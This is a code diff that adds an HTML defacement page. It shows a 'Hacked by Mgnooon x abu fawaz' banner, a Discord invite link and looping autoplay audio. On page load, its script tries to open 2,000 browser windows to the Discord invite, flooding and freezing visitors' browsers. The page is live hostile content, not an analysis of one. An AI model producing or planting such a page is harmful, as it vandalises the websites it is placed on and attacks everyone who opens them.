@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فتح نوافذ تلقائيًا إلى Discord</title>
+  <style>
+    /* إعدادات الخلفية */
+    body {
+      margin: 0;
+      background-color: black;
+      color: white;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* إعدادات الصورة */
+    .image-container {
+      margin-bottom: 10px;
+      border: 3px solid white;
+      padding: 10px;
+      border-radius: 10px;
+    }
+
+    .image-container img {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+    }
+
+    /* إعدادات النص */
+    .info {
+      text-align: center;
+      color: white;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .discord-link {
+      font-size: 36px;
+      color: white;
+      margin-top: 20px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .extra-text {
+      color: white;
+      font-size: 36px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- صورة -->
+  <div class="image-container">
+    <img src="https://media.discordapp.net/attachments/1294666102714007637/1304819449236295731/image.png?ex=6738b04f&is=67375ecf&hm=16919cd4b12fccdca75f3d715e34e5769f8656804ba0de87047f831b9242d579&=&format=webp&quality=lossless&width=388&height=396" alt="Banner Image">
+  </div>
+
+  <!-- نص إضافي تحت الصورة -->
+  <div class="extra-text"> Hacked by Mgnooon x abu fawaz </div>
+
+  <!-- رابط Discord -->
+  <a class="discord-link" href="https://discord.gg/5-1" target="_blank">discord.gg/q1</a>
+
+  <!-- إضافة الصوت -->
+  <audio id="background-sound" loop>
+    <source src="https://cdn.discordapp.com/attachments/1305247639906025622/1307119968709771406/1.mp3?ex=673925d5&is=6737d455&hm=7c8eb20c534d36b309ec732a890cfdb5c9e702ebabd127af02fd53e924d1264f&" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <script>
+    // تشغيل الصوت تلقائيًا عند تحميل الصفحة
+    window.onload = function() {
+      var audio = document.getElementById('background-sound');
+      audio.play();
+
+      let numOfWindows = 2000; // عدد النوافذ التي سيتم فتحها
+      let interval = setInterval(function() {
+        for (let i = 0; i < numOfWindows; i++) {
+          window.open("https://discord.gg/5-1", "_blank"); // رابط Discord
+        }
+        clearInterval(interval); // يتوقف بعد فتح النوافذ
+      }, 2000); // فتح النوافذ كل 2 ثانية
+    };
+  </script>
+
+</body>
+</html>
